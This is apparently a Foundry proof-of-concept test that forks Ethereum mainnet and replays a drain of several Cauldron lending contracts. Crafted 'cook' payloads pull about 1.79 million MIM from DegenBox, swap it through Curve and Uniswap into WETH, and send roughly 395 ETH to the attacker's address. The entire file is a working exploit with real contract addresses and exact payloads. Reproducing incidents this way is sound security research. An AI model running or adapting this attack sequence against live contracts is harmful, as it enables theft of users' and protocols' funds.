
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 23504545;
    uint256 constant TX_TIMESTAMP = 1759582463;
    uint256 constant TX_BLOCK_NUMBER = 23504546;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttackContrac();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        _executeAttack(attack);
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttackContrac() internal returns (OurAttack attack) {
        _installRuntimeFallb();
        attack = OurAttack(payable(ATTACK_CONTRACT));
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _expectedAttackChild(OurAttack attack) internal view returns (address) {
        attack;
        return address(0);
    }

    function _executeAttack(OurAttack attack) internal {
        attack.attack{value: TX_VALUE}();
    }

    function _installRuntimeFallb() internal {

        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.setNonce(ATTACK_CONTRACT, 1);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(
            Addresses.attacker_eoa, Addresses.attacker_eoa, Addresses.ZERO, "ETH", 395059475756313364054
        );
    }
}

contract OurAttack {
    constructor() payable {}

    function attack() external payable {
        _runAttack();
    }

    function executeSetup() external payable {
        _runAttack();
    }

    function _runAttack() internal {
        _setup();
    }

    function _handleCallback() internal {
        replayedHandleCallback = true;
    }

    function _setup() public {
        _readPoolState();
        _replayProtocolCalls();
        _readPoolState2();
        _replayProtocolCal9();
        _readPoolState3();
        _replayProtocolCal10();
        _readPoolState4();
        _replayProtocolCal11();
        _readPoolState5();
        _replayProtocolCal12();
        _readPoolState6();
        _replayProtocolCal13();
        _replayProtocolCal14();
        _replayProtocolCal15();
        _approveProtocolSp4();
        _replayProtocolCal16();
        _replayProtocolCal2();
        _replayProtocolCal3();
        _approveProtocolSpen();
        _replayProtocolCal4();
        _replayProtocolCal5();
        _approveProtocolSp2();
        _replayProtocolCal6();
        _approveProtocolSp3();
        _replayProtocolCal7();
        _replayProtocolCal8();
    }

    function _readPoolState() internal {
        IDegenBox(Addresses.DegenBox)
            .balanceOf(Addresses.MIM, Addresses.PrivilegedCheckpointCauldronV4_F82C);
        IDegenBox(Addresses.DegenBox).toAmount(Addresses.MIM, 736232217688141260022912, false);
    }

    function _replayProtocolCalls() internal {
        {
            uint8[] memory abiArg0 = new uint8[](2);
            abiArg0[0] = uint8(5);
            abiArg0[1] = uint8(0);
            bytes[] memory abiArg2 = new bytes[](2);
            bytes memory cookPayload1 =
                hex"000000000000000000000000000000000000000000009be774fe704b928b873f000000000000000000000000b8e0a4758df2954063ca4ba3d094f2d6eda9b993";
            abiArg2[0] = cookPayload1;
            abiArg2[1] = hex"";
            IPrivilegedCheckpointCauldronV4_F82C(Addresses.PrivilegedCheckpointCauldronV4_F82C)
                .cook(abiArg0, _uintArray2(0, 0), abiArg2);
        }
    }

    function _readPoolState2() internal {
        IDegenBox(Addresses.DegenBox).balanceOf(Addresses.MIM, Addresses.PrivilegedCheckpointCauldronV4);
        IDegenBox(Addresses.DegenBox).toAmount(Addresses.MIM, 75477235211805918200769, false);
    }

    function _replayProtocolCal9() internal {
        {
            uint8[] memory abiArg0 = new uint8[](2);
            abiArg0[0] = uint8(5);
            abiArg0[1] = uint8(0);
            bytes[] memory abiArg2 = new bytes[](2);
            bytes memory cookPayload2 =
                hex"000000000000000000000000000000000000000000000ffba70d46c324a1f5dc000000000000000000000000b8e0a4758df2954063ca4ba3d094f2d6eda9b993";
            abiArg2[0] = cookPayload2;
            abiArg2[1] = hex"";
            IPrivilegedCheckpointCauldronV4(Addresses.PrivilegedCheckpointCauldronV4)
                .cook(abiArg0, _uintArray2(0, 0), abiArg2);
        }
    }

    function _readPoolState3() internal {
        IDegenBox(Addresses.DegenBox).balanceOf(Addresses.MIM, Addresses.PrivilegedCauldronV4_865B);
        IDegenBox(Addresses.DegenBox).toAmount(Addresses.MIM, 612313552561697359796747, false);
    }

    function _replayProtocolCal10() internal {
        {
            uint8[] memory abiArg0 = new uint8[](2);
            abiArg0[0] = uint8(5);
            abiArg0[1] = uint8(0);
            bytes[] memory abiArg2 = new bytes[](2);
            bytes memory cookPayload3 =
                hex"0000000000000000000000000000000000000000000081a9c6351fe33c8c673c000000000000000000000000b8e0a4758df2954063ca4ba3d094f2d6eda9b993";
            abiArg2[0] = cookPayload3;
            abiArg2[1] = hex"";
            IPrivilegedCauldronV4_865B(Addresses.PrivilegedCauldronV4_865B)
                .cook(abiArg0, _uintArray2(0, 0), abiArg2);
        }
    }

    function _readPoolState4() internal {
        IDegenBox(Addresses.DegenBox).balanceOf(Addresses.MIM, Addresses.PrivilegedCauldronV4);
        IDegenBox(Addresses.DegenBox).toAmount(Addresses.MIM, 274846689470068597038378, false);
    }

    function _replayProtocolCal11() internal {
        {
            uint8[] memory abiArg0 = new uint8[](2);
            abiArg0[0] = uint8(5);
            abiArg0[1] = uint8(0);
            bytes[] memory abiArg2 = new bytes[](2);
            bytes memory cookPayload4 =
                hex"000000000000000000000000000000000000000000003a338ddffa963e1807cb000000000000000000000000b8e0a4758df2954063ca4ba3d094f2d6eda9b993";
            abiArg2[0] = cookPayload4;
            abiArg2[1] = hex"";
            IPrivilegedCauldronV4(Addresses.PrivilegedCauldronV4).cook(abiArg0, _uintArray2(0, 0), abiArg2);
        }
    }

    function _readPoolState5() internal {
        IDegenBox(Addresses.DegenBox).balanceOf(Addresses.MIM, Addresses.PrivilegedCauldronV4_CDA2);
        IDegenBox(Addresses.DegenBox).toAmount(Addresses.MIM, 85411627254104797488889, false);
    }

    function _replayProtocolCal12() internal {
        {
            uint8[] memory abiArg0 = new uint8[](2);
            abiArg0[0] = uint8(5);
            abiArg0[1] = uint8(0);
            bytes[] memory abiArg2 = new bytes[](2);
            bytes memory cookPayload5 =
                hex"0000000000000000000000000000000000000000000012163339da86d236f840000000000000000000000000b8e0a4758df2954063ca4ba3d094f2d6eda9b993";
            abiArg2[0] = cookPayload5;
            abiArg2[1] = hex"";
            IPrivilegedCauldronV4_CDA2(Addresses.PrivilegedCauldronV4_CDA2)
                .cook(abiArg0, _uintArray2(0, 0), abiArg2);
        }
    }

    function _readPoolState6() internal {
        IDegenBox(Addresses.DegenBox).balanceOf(Addresses.MIM, Addresses.A_C6D3B8_C20D);
        IDegenBox(Addresses.DegenBox).toAmount(Addresses.MIM, 9474541117269550572521, false);
    }

    function _replayProtocolCal13() internal {
        {
            uint8[] memory abiArg0 = new uint8[](2);
            abiArg0[0] = uint8(5);
            abiArg0[1] = uint8(0);
            bytes[] memory abiArg2 = new bytes[](2);
            bytes memory cookPayload6 =
                hex"0000000000000000000000000000000000000000000002019e6c8d3c41ae5bf9000000000000000000000000b8e0a4758df2954063ca4ba3d094f2d6eda9b993";
            abiArg2[0] = cookPayload6;
            abiArg2[1] = hex"";
            IContract_C6D3B8_C20D(Addresses.A_C6D3B8_C20D).cook(abiArg0, _uintArray2(0, 0), abiArg2);
        }
    }

    function _replayProtocolCal14() internal {
        IDegenBox(Addresses.DegenBox).balanceOf(Addresses.MIM, address(this));
        {
            uint256 withdrawActionGraphAmount = 1793755863303087483120210;
            IDegenBox(Addresses.DegenBox)
                .withdraw(Addresses.MIM, address(this), address(this), 0, withdrawActionGraphAmount);
        }
    }

    function _replayProtocolCal15() internal {
        IERC20Like(Addresses.MIM).balanceOf(address(this));
    }

    function _approveProtocolSp4() internal {
        {
            uint256 approveActionGraphAllowance = 1793766133547645084844120;
            IERC20Like(Addresses.MIM).approve(Addresses.CurveRouter_v1_2, approveActionGraphAllowance);
        }
    }

    function _replayProtocolCal16() internal {
        ICurveRouter_v1_2(Addresses.CurveRouter_v1_2)
            .exchange(
                [
                    Addresses.MIM,
                    Addresses.MIM_3LP3CRV_f,
                    Addresses.A_3Crv,
                    Addresses.ZERO,
                    Addresses.ZERO,
                    Addresses.ZERO,
                    Addresses.ZERO,
                    Addresses.ZERO,
                    Addresses.ZERO,
                    Addresses.ZERO,
                    Addresses.ZERO
                ],
                [
                    [
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000001),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000001),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000001),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000002)
                    ],
                    [
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000)
                    ],
                    [
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000)
                    ],
                    [
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000)
                    ],
                    [
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000)
                    ]
                ],
                0x000000000000000000000000000000000000000000017bd841c7394b45b74058,
                0x0000000000000000000000000000000000000000000000000000000000000000,
                [
                    Addresses.MIM_3LP3CRV_f,
                    Addresses.ZERO,
                    Addresses.ZERO,
                    Addresses.ZERO,
                    Addresses.ZERO
                ],
                address(this)
            );
    }

    function _replayProtocolCal2() internal {
        IERC20Like(Addresses.A_3Crv).balanceOf(address(this));
    }

    function _replayProtocolCal3() internal {
        {
            uint256 removeLiquidityActionGraphAmount = 1724494150504892603102815;
            IVyper_contract_BEBC44(Addresses.Vyper_contract_BEBC44)
                .remove_liquidity(removeLiquidityActionGraphAmount, [uint256(0), uint256(0), uint256(0)]);
        }
        IERC20Like(Addresses.DAI).balanceOf(address(this));
    }

    function _approveProtocolSpen() internal {
        {
            uint256 approveActionGraphAllowance_2 = 847146583150565851259202;
            IERC20Like(Addresses.DAI).approve(Addresses.CurveRouter_v1_2, approveActionGraphAllowance_2);
        }
    }

    function _replayProtocolCal4() internal {
        ICurveRouter_v1_2(Addresses.CurveRouter_v1_2)
            .exchange(
                [
                    Addresses.DAI,
                    Addresses.Vyper_contract_BEBC44,
                    Addresses.USDC,
                    Addresses.ZERO,
                    Addresses.ZERO,
                    Addresses.ZERO,
                    Addresses.ZERO,
                    Addresses.ZERO,
                    Addresses.ZERO,
                    Addresses.ZERO,
                    Addresses.ZERO
                ],
                [
                    [
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000001),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000001),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000001),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000002)
                    ],
                    [
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000)
                    ],
                    [
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000)
                    ],
                    [
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000)
                    ],
                    [
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000),
                        uint256(0x0000000000000000000000000000000000000000000000000000000000000000)
                    ]
                ],
                0x00000000000000000000000000000000000000000000b363e885e87aa289e142,
                0x0000000000000000000000000000000000000000000000000000000000000000,
                [
                    Addresses.Vyper_contract_BEBC44,
                    Addresses.ZERO,
                    Addresses.ZERO,
                    Addresses.ZERO,
                    Addresses.ZERO
                ],
                address(this)
            );
    }

    function _replayProtocolCal5() internal {
        IERC20Like(Addresses.USDC).balanceOf(address(this));
    }

    function _approveProtocolSp2() internal {
        {
            uint256 approveActionGraphAllowance_3 = 1577320717079;
            IERC20Like(Addresses.USDC).approve(Addresses.SwapRouter, approveActionGraphAllowance_3);
        }
        ISwapRouter(Addresses.SwapRouter)
            .exactInput(
                Abi_exactInput_Param0({
                    field0: abi.encodePacked(Addresses.USDC, uint24(500), Addresses.WETH),
                    field1: address(this),
                    field2: 1759582463,
                    field3: 1577320717079,
                    field4: 0
                })
            );
    }

    function _replayProtocolCal6() internal {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
    }

    function _approveProtocolSp3() internal {
        {
            uint256 approveActionGraphAllowance_4 = 215770635887;
            IERC20Like(Addresses.USDT).approve(Addresses.SwapRouter, approveActionGraphAllowance_4);
        }
        ISwapRouter(Addresses.SwapRouter)
            .exactInput(
                Abi_exactInput_Param0({
                    field0: abi.encodePacked(Addresses.USDT, uint24(500), Addresses.WETH),
                    field1: address(this),
                    field2: 1759582463,
                    field3: 215770635887,
                    field4: 0
                })
            );
    }

    function _replayProtocolCal7() internal {
        IERC20Like(Addresses.WETH).balanceOf(address(this));
        {
            uint256 withdrawActionGraphAmount_2 = 395059753040555107478;
            IWETH(Addresses.WETH).withdraw(withdrawActionGraphAmount_2);
        }
    }

    function _replayProtocolCal8() internal {
        if (address(this).balance > 0) {
            (bool ok,) = payable(Addresses.attacker_eoa).call{value: address(this).balance}("");
            require(ok, "selfdestruct beneficiary transfer failed");
        }
    }

    receive() external payable {}

    fallback() external payable {
        _entryCb();
    }

    function _entryCb() internal {}

    bool private replayedHandleCallback;

    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _tryHelperAt(address target, bytes memory data) internal {
        (bool ok,) = target.call(data);
        ok;
    }

    function _uintArray2(uint256 a0, uint256 a1) internal pure returns (uint256[] memory out) {
        out = new uint256[](2);
        out[0] = a0;
        out[1] = a1;
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant A_000000_0004 = 0x0000000000000000000000000000000000000004;
    address internal constant UniswapV3Pool = 0x11b815efB8f581194ae79006d24E0d814B7697F6;
    address internal constant attacker_eoa = 0x1AaaDe3e9062d124B7DeB0eD6DDC7055EFA7354d;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address internal constant PrivilegedCheckpointCauldronV4 = 0x289424aDD4A1A503870EB475FD8bF1D586b134ED;
    address internal constant PrivilegedCauldronV4 = 0x40d95C4b34127CF43438a963e7C066156C5b87a3;
    address internal constant FiatTokenV2_2 = 0x43506849D7C04F9138D1A2050bbF3A0c054402dd;
    address internal constant CurveRouter_v1_2 = 0x45312ea0eFf7E09C83CBE249fa1d7598c4C8cd4e;
    address internal constant PrivilegedCheckpointCauldronV4_F82C = 0x46f54d434063e5F1a2b2CC6d9AAa657b1B9ff82c;
    address internal constant MIM_3LP3CRV_f = 0x5a6A4D54456819380173272A5E8E9B9904BdF41B;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant PrivilegedCauldronV4_CDA2 = 0x6bcd99D6009ac1666b58CB68fB4A50385945CDA2;
    address internal constant A_3Crv = 0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490;
    address internal constant UniswapV3Pool_5640 = 0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640;
    address internal constant MIM = 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant attack_contract = 0xB8e0A4758Df2954063Ca4ba3d094f2d6EdA9B993;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant Morpho = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address internal constant Vyper_contract_BEBC44 = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant A_C36442_FE88 = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88;
    address internal constant A_C6D3B8_C20D = 0xC6D3b82f9774Db8F92095b5e4352a8bB8B0dC20d;
    address internal constant FiatTokenProxy = 0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf;
    address internal constant PrivilegedCauldronV4_865B = 0xce450a23378859fB5157F4C4cCCAf48faA30865B;
    address internal constant DegenBox = 0xd96f48665a1410C0cd669A88898ecA36B9Fc2cce;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant SwapRouter = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

struct Abi_exactInput_Param0 {
    bytes field0;
    address field1;
    uint256 field2;
    uint256 field3;
    uint256 field4;
}

interface IContract_C6D3B8_C20D {
    function cook(uint8[] calldata, uint256[] calldata, bytes[] calldata) external;
}

interface ICurveRouter_v1_2 {
    function exchange(address[11] calldata, uint256[5][5] calldata, uint256, uint256, address[5] calldata, address)
        external
        returns (uint256);
}

interface IDegenBox {
    function balanceOf(address, address) external view returns (uint256);
    function toAmount(address, uint256, bool) external view returns (uint256);
    function withdraw(address, address, address, uint256, uint256) external;
}

interface IPrivilegedCauldronV4 {
    function cook(uint8[] calldata, uint256[] calldata, bytes[] calldata) external;
}

interface IPrivilegedCauldronV4_865B {
    function cook(uint8[] calldata, uint256[] calldata, bytes[] calldata) external;
}

interface IPrivilegedCauldronV4_CDA2 {
    function cook(uint8[] calldata, uint256[] calldata, bytes[] calldata) external;
}

interface IPrivilegedCheckpointCauldronV4 {
    function cook(uint8[] calldata, uint256[] calldata, bytes[] calldata) external;
}

interface IPrivilegedCheckpointCauldronV4_F82C {
    function cook(uint8[] calldata, uint256[] calldata, bytes[] calldata) external;
}

interface ISwapRouter {
    function exactInput(Abi_exactInput_Param0 calldata) external returns (uint256);
}

interface IVyper_contract_BEBC44 {
    function remove_liquidity(uint256, uint256[3] calldata) external;
}

interface IWETH {
    function withdraw(uint256) external;
}
